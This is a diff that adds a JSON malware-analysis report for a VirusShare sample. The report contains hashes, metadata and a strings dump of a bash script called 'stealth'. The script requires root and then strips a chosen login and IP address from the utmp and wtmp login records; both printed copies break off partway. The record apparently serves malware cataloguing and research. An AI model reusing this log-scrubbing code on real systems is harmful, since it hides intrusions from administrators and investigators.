@@ -1,0 +1,88 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "#!/bin/bash\nclear\nROOT_UID=0\nif [ \"$UID\" -ne \"$ROOT_UID\" ]\nthen\n  echo \"    Termination of the script in 15 seconds\"\n  echo \"    ---------------------------------------\"\n  echo \"            You have no uid ROOT\"\n  echo \"             Permission denied!\"\n  echo\n  echo \"Your login (`whoami`):\"\n  echo \"`id`\"\n  sleep 15\n  exit $E_NOTROOT\nfi\nrm -f /tmp/time*\n\nif [ $# -lt 2 ]; then\n  echo \"################################################\"\n  echo \"#                                              #\"\n  echo \"#              Bad LOGIN or IP!                #\"\n  echo \"#             ------------------               #\"\n  echo \"#          Repeat rekeying, please.            #\"\n  echo \"#                                              #\"    \n  echo \"#     Example:  ./stealth login ip             #\"      \n  echo \"################################################\"\n  echo \n  echo \"Usage: $0 root 192.168.0.3\"\n  echo\n exit 1\nfi\n\nlogin=$1\nip=$2\n\nif [ \"$login\" != \"\" ]; then    \n if [ \"$ip\" != \"\" ]; then\n    l_f=$(echo \"$login\") #result who array\n    ip_f=$(echo \"$ip\")   #ip-address\n    echo \"Searching for of the files (utmp,wtmp,lastlog)\"\n    echo \"Please wait several minutes...\"\n    utmp_f='/var/run/utmp'\n    if [ -e $utmp_f ];then\n      sed -e \"s/$ip_f//g\" $utmp_f > $utmp_f.$$ 2>/dev/null \n      mv $utmp_f.$$ $utmp_f      \n      sed -e \"s/$l_f//g\" $utmp_f > $utmp_f.$$ 2>/dev/null \n      mv $utmp_f.$$ $utmp_f      \n    else\n      utmp=$(find / -type f -name 'utmp')\n      sed -e \"s/$ip_f//g\" $utmp > $utmp.$$ 2>/dev/null \n      mv $utmp.$$ $utmp      \n      sed -e \"s/$l_f//g\" $utmp > $utmp.$$ 2>/dev/null \n      mv $utmp.$$ $utmp\n    fi\n    \n    wtmp_f='/var/log/wtmp'\n    if [ -e $wtmp_f ];then\n      sed -e \"s/$ip_f//g\" $wtmp_f >"
+    },
+    "filename": "VirusShare_ff34ecd70504d87cf19eebcc8f1908ed",
+    "filesize": 1727,
+    "filetype": "Bourne-Again shell script, ASCII text executable",
+    "hashes": {
+        "md5": "ff34ecd70504d87cf19eebcc8f1908ed",
+        "sha1": "d840110654557acf29940a36a20a3036c709f04e",
+        "sha256": "7e7c0c44d3d54f399c6e967a273e333d73dc1ca83d612671f9fabbef29369857"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/bash",
+            "clear",
+            "ROOT_UID=0",
+            "if [ \"$UID\" -ne \"$ROOT_UID\" ]",
+            "then",
+            "  echo \"    Termination of the script in 15 seconds\"",
+            "  echo \"    ---------------------------------------\"",
+            "  echo \"            You have no uid ROOT\"",
+            "  echo \"             Permission denied!\"",
+            "  echo",
+            "  echo \"Your login (`whoami`):\"",
+            "  echo \"`id`\"",
+            "  sleep 15",
+            "  exit $E_NOTROOT",
+            "rm -f /tmp/time*",
+            "if [ $# -lt 2 ]; then",
+            "  echo \"################################################\"",
+            "  echo \"#                                              #\"",
+            "  echo \"#              Bad LOGIN or IP!                #\"",
+            "  echo \"#             ------------------               #\"",
+            "  echo \"#          Repeat rekeying, please.            #\"",
+            "  echo \"#                                              #\"    ",
+            "  echo \"#     Example:  ./stealth login ip             #\"      ",
+            "  echo \"################################################\"",
+            "  echo ",
+            "  echo \"Usage: $0 root 192.168.0.3\"",
+            "  echo",
+            " exit 1",
+            "login=$1",
+            "ip=$2",
+            "if [ \"$login\" != \"\" ]; then    ",
+            " if [ \"$ip\" != \"\" ]; then",
+            "    l_f=$(echo \"$login\") #result who array",
+            "    ip_f=$(echo \"$ip\")   #ip-address",
+            "    echo \"Searching for of the files (utmp,wtmp,lastlog)\"",
+            "    echo \"Please wait several minutes...\"",
+            "    utmp_f='/var/run/utmp'",
+            "    if [ -e $utmp_f ];then",
+            "      sed -e \"s/$ip_f//g\" $utmp_f > $utmp_f.$$ 2>/dev/null ",
+            "      mv $utmp_f.$$ $utmp_f      ",
+            "      sed -e \"s/$l_f//g\" $utmp_f > $utmp_f.$$ 2>/dev/null ",
+            "      mv $utmp_f.$$ $utmp_f      ",
+            "    else",
+            "      utmp=$(find / -type f -name 'utmp')",
+            "      sed -e \"s/$ip_f//g\" $utmp > $utmp.$$ 2>/dev/null ",
+            "      mv $utmp.$$ $utmp      ",
+            "      sed -e \"s/$l_f//g\" $utmp > $utmp.$$ 2>/dev/null ",
+            "      mv $utmp.$$ $utmp",
+            "    fi",
+            "    ",
+            "    wtmp_f='/var/log/wtmp'",
+            "    if [ -e $wtmp_f ];then",
+            "      sed -e \"s/$ip_f//g\" $wtmp_f >"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "192.168.0.3"
+        ],
+        "url": []
+    },
+    "time": "0:00:00.295466",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
